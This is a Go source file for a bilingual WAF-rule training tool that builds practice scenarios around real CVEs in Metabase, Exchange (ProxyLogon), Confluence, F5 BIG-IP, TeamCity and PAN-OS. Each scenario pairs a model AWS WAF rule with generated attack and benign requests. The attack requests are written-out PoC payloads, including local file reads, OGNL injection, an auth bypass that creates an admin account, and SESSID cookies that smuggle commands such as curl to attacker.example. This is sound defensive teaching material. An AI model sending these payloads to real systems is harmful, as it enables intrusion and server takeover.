package scenario

import (
	"fmt"
	"math/rand/v2"

	w "wafdy/internal/wafrule"
)

// 実際の CVE への対応を練習する追加問題。

func withCookie(req Request, cookie string) Request { return withHeader(req, "Cookie", cookie) }

func registerLabCVEs() {
	lab(1, &Scenario{
		ID:    "lab-1-metabase-geojson",
		CVE:   "CVE-2021-41277",
		Title: T("Metabase: GeoJSON の URL でローカルファイルを読む", "Metabase: reading local files through the GeoJSON URL"),
		Summary: T("地図用の GeoJSON を取得する API が file: の URL を受け付け、サーバー内のファイルを読まれる脆弱性。",
			"The API that fetches GeoJSON for maps accepts file: URLs, exposing files on the server."),
		Topics: []Text{T("前方一致", "Prefix match"), T("特定のクエリパラメータ", "A single query parameter")},
		Briefing: []Text{
			T("BI ツール Metabase の GET /api/geojson?url=<URL> は、カスタム地図の GeoJSON を取得するための API です。URL の種類を確認していなかったため、file:/etc/passwd のような URL でサーバー内のファイルを読み出せてしまう脆弱性が見つかりました。",
				"Metabase's GET /api/geojson?url=<URL> fetches GeoJSON for custom maps. Because it didn't check the URL scheme, URLs like file:/etc/passwd let attackers read files on the server."),
		},
		Conditions: []Text{
			T("url パラメータに URL decode と Lowercase をかけ、file: で始まるものをブロックしてください (前方一致)。",
				"Apply URL decode and Lowercase to the url parameter and block values starting with file: (prefix match)."),
			T("正規の GeoJSON の URL はすべて https です。URL の途中に file: という文字が出てくるものもあります。",
				"Legitimate GeoJSON URLs are all https. Some contain the characters file: in the middle."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (file:/)", "The PoC as published (file:/)"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/geojson", q("url", "file:/etc/passwd")))
			}},
			{Attack, T("スラッシュ 3 つ (file:///)", "Three slashes (file:///)"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/geojson", q("url", "file:///etc/hosts")))
			}},
			{Attack, T("大文字の FILE:", "Uppercase FILE:"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/geojson", q("url", "FILE:/proc/self/environ")))
			}},
			{Benign, T("正規の GeoJSON", "Legitimate GeoJSON"), 25, func(r *rand.Rand) Request {
				return get(r, "/api/geojson", q("url", pick(r, []string{
					"https://maps.example.com/japan.geojson",
					"https://cdn.example.net/profile:map.json",
					"https://maps.example.com/regions/tokyo.json",
				})))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-metabase-file-url", w.StartsWith("file:", w.QueryArg("url"), w.URLDecode, w.Lowercase)),
		SolutionNote: []Text{
			T("STARTS_WITH を使うので、profile:map.json のように URL の途中に file: が出てくる正規の URL は止まりません。CONTAINS にすると誤検知になります。",
				"Using STARTS_WITH leaves legitimate URLs with file: in the middle, like profile:map.json, alone. CONTAINS would cause false positives."),
			T("根本的には、アプリ側で許可するスキーム (https) とホストを決めておくのが対策です。Level 3 の SSRF の問題で許可リストの書き方を練習できます。",
				"The real fix is for the app to define which schemes (https) and hosts are allowed. The Level 3 SSRF problem practices writing allow lists."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-proxylogon",
		CVE:   "CVE-2021-26855",
		Title: T("ProxyLogon: Cookie で内部サーバーを指定する", "ProxyLogon: naming an internal server in a cookie"),
		Summary: T("Exchange Server の SSRF。特殊な Cookie で、認証なしに内部のバックエンドへリクエストを転送させます。",
			"An SSRF in Exchange Server: special cookies make it forward requests to internal back ends without authentication."),
		Topics: []Text{T("Cookie ヘッダーの検査", "Inspecting the Cookie header"), T("似た名前の正規の Cookie", "Legitimate cookies with similar names")},
		Briefing: []Text{
			T("Microsoft Exchange Server で、X-AnonResource-Backend や X-BEResource という Cookie に転送先を書くと、認証なしで内部のサーバーにリクエストを転送させられる脆弱性 (ProxyLogon) が見つかりました。大規模な攻撃キャンペーンで使われ、Web シェルを置かれる被害が相次ぎました。",
				"Microsoft Exchange Server lets attackers write a destination in cookies named X-AnonResource-Backend or X-BEResource and have requests forwarded to internal servers without authentication (ProxyLogon). It was used in large-scale campaigns that planted web shells."),
		},
		Conditions: []Text{
			T("Cookie ヘッダーに Lowercase をかけ、x-anonresource-backend= か x-beresource= を含むものをブロックしてください。",
				"Apply Lowercase to the Cookie header and block anything containing x-anonresource-backend= or x-beresource=."),
			T("Exchange の正規のクライアントは X-BackEndCookie や X-OWA-CANARY という Cookie を使います。これは止めないでください。",
				"Legitimate Exchange clients use cookies named X-BackEndCookie and X-OWA-CANARY. Don't block them."),
		},
		Patterns: []Pattern{
			{Attack, T("X-BEResource で転送", "Forwarding with X-BEResource"), 12, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/ecp/wafdy.js", "")), "X-BEResource=localhost/EWS/Exchange.asmx?a=~1942062522; X-AnonResource=true")
			}},
			{Attack, T("X-AnonResource-Backend で転送", "Forwarding with X-AnonResource-Backend"), 12, func(r *rand.Rand) Request {
				return withCookie(atk(r, get(r, "/owa/auth/x.js", "")), "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3")
			}},
			{Attack, T("Cookie 名を小文字で", "Cookie name in lowercase"), 12, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/ecp/y.js", "")), "x-beresource=exchange01.corp.example/autodiscover/autodiscover.xml?a=~1942062522")
			}},
			{Benign, T("Outlook on the web の正規の Cookie", "Legitimate Outlook on the web cookies"), 25, func(r *rand.Rand) Request {
				return withCookie(get(r, pick(r, []string{"/owa/", "/ecp/", "/owa/auth/logon.aspx"}), ""),
					"X-BackEndCookie=S-1-5-21-123=u56Lnp2ejJqByZrGzsjJx8vSnMbIy9LLyc7L; X-OWA-CANARY=wafdyCanary0123456789")
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-proxylogon-cookies", w.Or(
			w.Contains("x-anonresource-backend=", w.Header("cookie"), w.Lowercase),
			w.Contains("x-beresource=", w.Header("cookie"), w.Lowercase),
		)),
		SolutionNote: []Text{
			T("Cookie は 1 つの Cookie ヘッダーにまとめて入って届くので、Single header で cookie を検査します。= まで含めると、Cookie の名前として使われたときだけに一致します。",
				"Cookies arrive together in one Cookie header, so inspect cookie with Single header. Including the = makes it match only when used as a cookie name."),
			T("x-be だけで判定すると、正規の X-BackEndCookie まで止めてしまいます。",
				"Matching on just x-be would also block the legitimate X-BackEndCookie."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-confluence-velocity",
		CVE:   "CVE-2023-22527",
		Title: T("Confluence: テンプレートファイルの直接呼び出し", "Confluence: calling template files directly"),
		Summary: T("Confluence の Velocity テンプレートを外から直接呼び出し、OGNL 式を注入できる脆弱性。",
			"Confluence's Velocity templates can be called directly from outside and injected with OGNL expressions."),
		Topics: []Text{T("後方一致", "Suffix match"), T("使わない入口を閉じる", "Closing unused entry points")},
		Briefing: []Text{
			T("Confluence Data Center / Server の古いバージョンで、画面の部品を作る Velocity テンプレート (/template/aui/text-inline.vm) を外部から直接呼び出し、パラメータに OGNL 式を入れると、認証なしで任意のコードを実行できる脆弱性が見つかりました。",
				"In older Confluence Data Center / Server versions, the Velocity template that builds UI parts (/template/aui/text-inline.vm) can be called directly from outside; putting an OGNL expression in its parameters allows unauthenticated code execution."),
		},
		Conditions: []Text{
			T("Velocity テンプレート (拡張子 .vm) は内部で使うもので、ブラウザから直接呼び出すことはありません。URI path に Lowercase をかけ、.vm で終わるものをブロックしてください (後方一致)。",
				"Velocity templates (.vm files) are used internally and are never called directly by browsers. Apply Lowercase to the URI path and block paths ending in .vm (suffix match)."),
			T("ドキュメントには vm という文字を含むページやファイル名もあります。",
				"Some documentation pages and file names contain the letters vm."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/template/aui/text-inline.vm", "label=\\u0027%2b#request['wafdy']%2b\\u0027"))
			}},
			{Attack, T("コンテキストパス付き", "With a context path"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/confluence/template/aui/text-inline.vm", "label=\\u0027%2b#request.get('wafdy')%2b\\u0027"))
			}},
			{Attack, T("GET で呼び出す", "Called with GET"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/template/aui/text-inline.vm", "label=wafdy-test"))
			}},
			{Benign, T("vm を含むドキュメント", "Documentation containing vm"), 25, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/docs/vm-guide", "/download/archive.vm.zip", "/pages/viewpage.action", "/display/OPS/vmware"}), "")
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-confluence-velocity", w.EndsWith(".vm", w.UriPath(), w.Lowercase)),
		SolutionNote: []Text{
			T("ENDS_WITH (後方一致) で .vm を指定すると、archive.vm.zip や /docs/vm-guide のように途中に vm がある正規のページは止まりません。",
				"Specifying .vm with ENDS_WITH (suffix match) leaves legitimate pages with vm in the middle, such as archive.vm.zip and /docs/vm-guide, alone."),
			T("OGNL の書き方を追うより、そもそも外から呼ばれるはずのない入口 (テンプレートファイル) を閉じるほうが、亜種にも強いルールになります。",
				"Closing an entry point that should never be called from outside (template files) is more robust against variants than chasing OGNL syntax."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-f5-tmui",
		CVE:   "CVE-2020-5902",
		Title: T("F5 BIG-IP TMUI: ..;/ でログインを飛ばす", "F5 BIG-IP TMUI: skipping login with ..;/"),
		Summary: T("管理画面 TMUI で、..;/ というパスの書き方で認証を回避し、ファイルの読み出しやコマンドの実行ができる脆弱性。",
			"In the TMUI admin interface, writing the path as ..;/ bypasses authentication, allowing file reads and command execution."),
		Topics: []Text{T("ベンダーの緩和策の移植", "Porting a vendor mitigation"), T("エンコードされた区切り文字", "Encoded delimiters")},
		Briefing: []Text{
			T("BIG-IP の管理画面 TMUI で、/tmui/login.jsp/..;/tmui/... のようにパスに ..; を入れると、ログインのチェックを通ったまま別のページに到達できる脆弱性が見つかりました。前段の Apache と後段の Tomcat が ; の意味を別々に解釈することが原因です。",
				"In BIG-IP's TMUI admin interface, putting ..; in the path, as in /tmui/login.jsp/..;/tmui/..., reaches other pages while still passing the login check. The front-end Apache and back-end Tomcat interpret ; differently."),
			T("公開された PoC: /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
				"Published PoC: /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"),
		},
		Conditions: []Text{
			T("F5 は Apache の設定で、パスが正規表現 .*\\.\\.;.* に一致するリクエストを拒否する緩和策を出しました。同じ意味のルールを AWS WAF で作ってください。",
				"F5 published a mitigation that uses Apache configuration to reject requests whose path matches the regex .*\\.\\.;.*. Build a rule with the same meaning in AWS WAF."),
			T("攻撃者は . や ; を URL エンコードした亜種も使います。Tomcat はデコードしてから解釈します。",
				"Attackers also use variants with . or ; URL-encoded. Tomcat interprets the path after decoding."),
			T("このシステムでは、セッション ID をパスに付ける ;jsessionid=... という正規の書き方も使われています。",
				"This system also uses the legitimate ;jsessionid=... form, which attaches the session ID to the path."),
		},
		Hints: []Text{
			T(".*\\.\\.;.* の前後の .* は「何があってもよい」という意味なので、「..; を含む」と同じです。",
				"The .* before and after in .*\\.\\.;.* mean \"anything\", so the regex is the same as \"contains ..;\"."),
			T("%2e%2e%3b のようにエンコードされた形にも対応するには、URL decode をかけてから比べます。",
				"To handle encoded forms like %2e%2e%3b, apply URL decode before comparing."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (..;/)", "The PoC as published (..;/)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp", "fileName=/etc/passwd"))
			}},
			{Attack, T("ドットをエンコード (%2e%2e;)", "Encoded dots (%2e%2e;)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tmui/login.jsp/%2e%2e;/tmui/locallb/workspace/fileRead.jsp", "fileName=/etc/hosts"))
			}},
			{Attack, T("; をエンコード (..%3b)", "Encoded semicolon (..%3b)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tmui/login.jsp/..%3b/tmui/locallb/workspace/tmshCmd.jsp", "command=list+auth+user+admin"))
			}},
			{Attack, T("すべてを大文字でエンコード", "Everything encoded in uppercase"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tmui/login.jsp/%2E%2E%3B/tmui/system/user/authproperties.jsp", ""))
			}},
			{Benign, T("ログイン画面と静的ファイル", "Login page and static files"), 15, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/tmui/login.jsp", "/tmui/tmui/login/images/logo.png", "/tmui/login.jsp?msgcode=1"}), "")
			}},
			{Benign, T(";jsessionid 付きのパス", "Paths with ;jsessionid"), 15, func(r *rand.Rand) Request {
				return get(r, fmt.Sprintf("/tmui/Control/jspmap/tmui/overview/welcome.jsp;jsessionid=%08X", r.Uint32()), "")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-f5-tmui-traversal", w.Contains("..;", w.UriPath(), w.URLDecode)),
		SolutionNote: []Text{
			T("先頭と末尾の .* はどこに出てきてもよいという意味なので、正規表現ではなく「..; を含む」という文字列マッチに置き換えられます。文字列マッチは正規表現より WCU が小さく、読みやすくなります。",
				"The leading and trailing .* just mean \"anywhere\", so you can replace the regex with a string match: \"contains ..;\". String matches cost fewer WCUs than regexes and are easier to read."),
			T("URL decode をかけると、%2e%2e; や ..%3b のようにエンコードされた形も ..; になります。; だけで判定すると、正規の ;jsessionid= まで止めてしまいます。",
				"URL decode turns encoded forms such as %2e%2e; and ..%3b into ..;. Matching on ; alone would also block the legitimate ;jsessionid=."),
		},
		Pitfall: w.Block("pitfall-f5-tmui", w.Contains("..;/", w.UriPath())),
		PitfallNote: []Text{
			T("PoC の ..;/ をデコードせずに探すルールです。. や ; をエンコードした亜種がすべてすり抜けます。",
				"This rule looks for the PoC's ..;/ without decoding. Every variant with . or ; encoded slips through."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-teamcity-jsp",
		CVE:   "CVE-2024-27198",
		Title: T("TeamCity: ;.jsp を付けて認証をすり抜ける", "TeamCity: slipping past auth with ;.jsp"),
		Summary: T("CI サーバー TeamCity で、jsp パラメータに ;.jsp を付けた API のパスを指定すると、認証なしで管理 API を呼べる脆弱性。",
			"In the TeamCity CI server, passing an API path ending in ;.jsp in the jsp parameter calls admin APIs without authentication."),
		Topics: []Text{T("パラメータの値を見る", "Inspecting parameter values"), T("過剰なブロックを避ける", "Avoiding over-blocking")},
		Briefing: []Text{
			T("JetBrains TeamCity で、存在しないパスに ?jsp=/app/rest/users;.jsp のようなパラメータを付けると、認証のチェックを通らずに REST API が呼ばれてしまう脆弱性が見つかりました。攻撃者は管理者アカウントやアクセストークンを作成し、サーバーを乗っ取ります。",
				"In JetBrains TeamCity, adding a parameter like ?jsp=/app/rest/users;.jsp to a nonexistent path calls the REST API without passing the authentication check. Attackers create admin accounts or access tokens and take over the server."),
			T("公開された PoC: GET /hax?jsp=/app/rest/server;.jsp",
				"Published PoC: GET /hax?jsp=/app/rest/server;.jsp"),
		},
		Conditions: []Text{
			T("攻撃は jsp パラメータに ;.jsp で終わる値を入れます。; は %3b とエンコードされることもあります。",
				"The attack puts a value ending in ;.jsp into the jsp parameter. The ; may be encoded as %3b."),
			T("TeamCity の画面の一部は、jsp=false のように jsp という名前のパラメータを正規に使っています。",
				"Some TeamCity pages legitimately use a parameter named jsp, as in jsp=false."),
		},
		Hints: []Text{
			T("「jsp パラメータがあるか」ではなく「jsp パラメータの値に ;.jsp が含まれるか」で判定しましょう。",
				"Decide based on whether the jsp parameter's value contains ;.jsp, not on whether the parameter exists."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/hax", "jsp=/app/rest/server;.jsp"))
			}},
			{Attack, T("管理者の作成", "Creating an administrator"), 10, func(r *rand.Rand) Request {
				req := withBody(atk(r, post(r, "/wafdy", "")), "application/json", `{"username":"wafdy","password":"wafdy-test","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}`)
				req.RawQuery = "jsp=/app/rest/users;.jsp"
				return req
			}},
			{Attack, T("アクセストークンの作成", "Creating an access token"), 10, func(r *rand.Rand) Request {
				req := atk(r, post(r, "/pwned", ""))
				req.RawQuery = "jsp=/app/rest/users/id:1/tokens/wafdy;.jsp"
				return req
			}},
			{Attack, T("; をエンコード", "Encoded semicolon"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/x", "jsp=/app/rest/users%3b.JSP"))
			}},
			{Benign, T("jsp パラメータを使う正規の画面", "Legitimate pages using the jsp parameter"), 20, func(r *rand.Rand) Request {
				return get(r, "/viewLog.html", fmt.Sprintf("buildId=%d&tab=buildLog&jsp=false", 100+r.IntN(900)))
			}},
			{Benign, T("ログインと REST API", "Login and the REST API"), 15, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/login.html", "/app/rest/server", "/app/rest/builds"}), "")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-teamcity-jsp-bypass", w.Contains(";.jsp", w.QueryString(), w.URLDecode, w.Lowercase)),
		SolutionNote: []Text{
			T("攻撃の本質は「jsp パラメータに ;.jsp で終わる API のパスを入れる」ことです。値の ;.jsp でとらえるので、jsp=false のような正規の利用は止まりません。",
				"The essence of the attack is putting an API path ending in ;.jsp into the jsp parameter. Catching the ;.jsp in the value leaves legitimate uses such as jsp=false alone."),
			T("POST では jsp がクエリ文字列に入っています (管理者の作成の攻撃)。Body のフォームに入れる亜種に備えるなら、Body にも同じ条件を OR で足します。",
				"For POST, jsp is in the query string (the admin-creation attack). To prepare for variants that put it in a form body, add the same condition for the body with OR."),
		},
		Pitfall: w.Block("pitfall-teamcity", w.Present(w.QueryArg("jsp"))),
		PitfallNote: []Text{
			T("jsp パラメータが付いているリクエストをすべて止めるルールです。攻撃は止まりますが、jsp=false を使う正規の画面まで止めてしまいます。",
				"This rule blocks every request that has a jsp parameter. It stops the attacks but also blocks the legitimate pages that use jsp=false."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-panos-sessid",
		CVE:   "CVE-2024-3400",
		Title: T("PAN-OS GlobalProtect: セッション Cookie からのコマンド実行", "PAN-OS GlobalProtect: command execution from a session cookie"),
		Summary: T("VPN ゲートウェイが SESSID Cookie の値をファイル名に使い、ディレクトリの遡りとコマンドの埋め込みを許してしまう脆弱性。",
			"The VPN gateway uses the SESSID cookie value as a file name, allowing directory traversal and embedded commands."),
		Topics: []Text{T("Cookie の中の特定の値", "A specific value inside cookies"), T("許可リスト (正規表現)", "Allow lists (regex)")},
		Briefing: []Text{
			T("Palo Alto Networks の PAN-OS (GlobalProtect) で、SESSID Cookie の値がそのままファイルのパスとして使われていました。値にディレクトリの遡りを入れると任意の場所に空のファイルを作れ、ファイル名にコマンドを埋め込むと、定期的に動く処理がそれを実行してしまいます。",
				"In Palo Alto Networks PAN-OS (GlobalProtect), the SESSID cookie value was used directly as a file path. Putting a directory climb in the value creates an empty file anywhere, and embedding a command in the file name gets it executed by a periodic job."),
			T("観測された PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`",
				"Observed PoC: Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。ファイルを作るだけの攻撃 (遡りのみ) と、コマンドを埋め込む攻撃があります。",
				"There is no mitigation guidance this time. Some attacks only create a file (just the climb) and some embed a command."),
			T("正規の SESSID は英数字だけです。ほかの Cookie には、returnTo=../portal のように記号を含むものもあります。",
				"Legitimate SESSID values contain only letters and digits. Other cookies may contain symbols, like returnTo=../portal."),
		},
		Hints: []Text{
			T("Cookie ヘッダーには複数の Cookie が ; 区切りで入っています。SESSID= のあとに続く値だけを調べる必要があります。",
				"The Cookie header holds several cookies separated by ;. You need to check only the value following SESSID=."),
			T("「SESSID= のあと、英数字が続いたあとに、英数字でも ; でもない文字が来る」ものに一致する正規表現を書くと、SESSID の値に記号が含まれるものだけをとらえられます。",
				"A regex matching \"after SESSID=, some letters and digits, then a character that is neither a letter, digit, nor ;\" catches only SESSID values containing symbols."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (遡り + バッククォート)", "The PoC as published (climb + backticks)"), 8, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy`curl${IFS}attacker.example`")
			}},
			{Attack, T("ファイルを作るだけ (遡りのみ)", "Only creating a file (climb only)"), 8, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/wafdy.txt")
			}},
			{Attack, T("$( ) によるコマンド置換", "Command substitution with $( )"), 8, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/ssl-vpn/hipreport.esp", "")), "lang=en; SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/w$(id>/tmp/wafdy)")
			}},
			{Attack, T("Cookie 名を小文字で", "Cookie name in lowercase"), 8, func(r *rand.Rand) Request {
				return withCookie(atk(r, post(r, "/global-protect/login.esp", "")), "sessid=/../../../opt/panlogs/tmp/device_telemetry/minute/wafdy")
			}},
			{Benign, T("正規の VPN 接続", "Legitimate VPN connections"), 25, func(r *rand.Rand) Request {
				return withCookie(post(r, "/ssl-vpn/hipreport.esp", ""), fmt.Sprintf("SESSID=%016x; lang=ja-JP", r.Uint64()))
			}},
			{Benign, T("記号を含むほかの Cookie", "Other cookies with symbols"), 15, func(r *rand.Rand) Request {
				return withCookie(get(r, "/global-protect/portal/portal.esp", ""), fmt.Sprintf("returnTo=../portal; SESSID=%016x", r.Uint64()))
			}},
			{Benign, lblBrowse, 10, browse},
		},
		Solution: w.Block("block-panos-sessid", w.Regex(`(^|;\s*)sessid=[a-z0-9]*[^a-z0-9;\s]`, w.Header("cookie"), w.Lowercase)),
		SolutionNote: []Text{
			T("(^|;\\s*) で「Cookie ヘッダーの先頭か、; のあと」に限定してから sessid= を探すので、ほかの Cookie の値の途中にある文字列には一致しません。",
				"(^|;\\s*) restricts the search to \"the start of the header or right after a ;\" before looking for sessid=, so it doesn't match text in the middle of other cookies' values."),
			T("そのあと [a-z0-9]*[^a-z0-9;\\s] で「英数字が続いたあとに、英数字でも ; でも空白でもない文字が来る」かを調べます。SESSID の値に / . ` $ などの記号が 1 つでもあれば一致します。",
				"Then [a-z0-9]*[^a-z0-9;\\s] checks whether, after some letters and digits, a character comes that is not a letter, digit, ;, or space. Any symbol in the SESSID value, such as / . ` or $, makes it match."),
			T("returnTo=../portal のように、ほかの Cookie に記号があっても止まりません。PoC のバッククォートや curl ではなく「正規の値の形」でとらえることで、ファイルを作るだけの攻撃も止められます。",
				"Symbols in other cookies, like returnTo=../portal, don't trigger it. By targeting the shape of legitimate values rather than the PoC's backticks or curl, the rule also stops the file-creation-only attack."),
		},
		Pitfall: w.Block("pitfall-panos", w.Contains("`", w.Header("cookie"))),
		PitfallNote: []Text{
			T("PoC のバッククォートを探すルールです。ファイルを作るだけの攻撃と、$( ) を使う攻撃がすり抜けます。",
				"This rule looks for the PoC's backticks. The file-creation-only attack and the $( ) attack slip through."),
		},
	})
}
